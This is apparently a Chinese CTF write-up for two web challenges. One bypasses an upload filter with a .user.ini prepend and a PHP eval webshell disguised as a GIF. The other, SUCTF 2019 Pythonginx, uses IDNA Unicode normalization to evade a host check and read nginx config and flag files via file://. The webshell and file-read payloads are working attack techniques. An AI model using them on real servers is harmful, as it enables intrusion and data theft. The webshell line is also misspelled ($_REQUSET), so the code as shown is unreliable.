## 0x01 Checkin

00 0a后缀无法绕过。

文件头监测使用GIF89a

内容过滤<?使用类脚本语法写入php代码

文件夹下有index.php，提示利用``.user.ini``写图片马

```
GIF89a
auto_prepend_file=233.gif
```

```
GIF89a
<script language="php"> 
@eval($_REQUSET['eki']);
</script>
```

用蚁剑连上，或者直接写system("cat \flag")

### 参考资料

user.ini文件构成的PHP后门

[https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html](https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html)

## 0x09 [SUCTF 2019]Pythonginx

```python
@app.route('/getUrl', methods=['GET', 'POST'])
def getUrl():
    url = request.args.get("url")
    host = parse.urlparse(url).hostname
    if host == 'suctf.cc':
        return "我扌 your problem? 111"
    parts = list(urlsplit(url))
    host = parts[1]
    if host == 'suctf.cc':
        return "我扌 your problem? 222 " + host
    newhost = []
    for h in host.split('.'):
        newhost.append(h.encode('idna').decode('utf-8'))
    parts[1] = '.'.join(newhost)
    #去掉 url 中的空格
    finalUrl = urlunsplit(parts).split(' ')[0]
    host = parse.urlparse(finalUrl).hostname
    if host == 'suctf.cc':
        return urllib.request.urlopen(finalUrl).read()
    else:
        return "我扌 your problem? 333"
```

这里利用的是"idna"编码解码的问题

```
suctf.c℆ -> suctf.cc/u
```

利用file://协议读文件，提示了nginx

```
配置文件存放目录：/etc/nginx
主配置文件：/etc/nginx/conf/nginx.conf
管理脚本：/usr/lib64/systemd/system/nginx.service
模块：/usr/lisb64/nginx/modules
应用程序：/usr/sbin/nginx
程序默认存放位置：/usr/share/nginx/html
日志默认存放位置：/var/log/nginx
```

```
file://suctf.c℆sr/local/nginx/conf/nginx.conf
->
server { listen 80; location / { try_files $uri @app; } location @app { include uwsgi_params; uwsgi_pass unix:///tmp/uwsgi.sock; } location /static { alias /app/static; } # location /flag { # alias /usr/fffffflag; # } }

file://suctf.c℆sr/fffffflag
```



### 参考资料

nginx重要目录：

[https://www.jianshu.com/p/e64539590865](https://www.jianshu.com/p/e64539590865)

Unicode vulnerabilities:

[https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf)](https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf)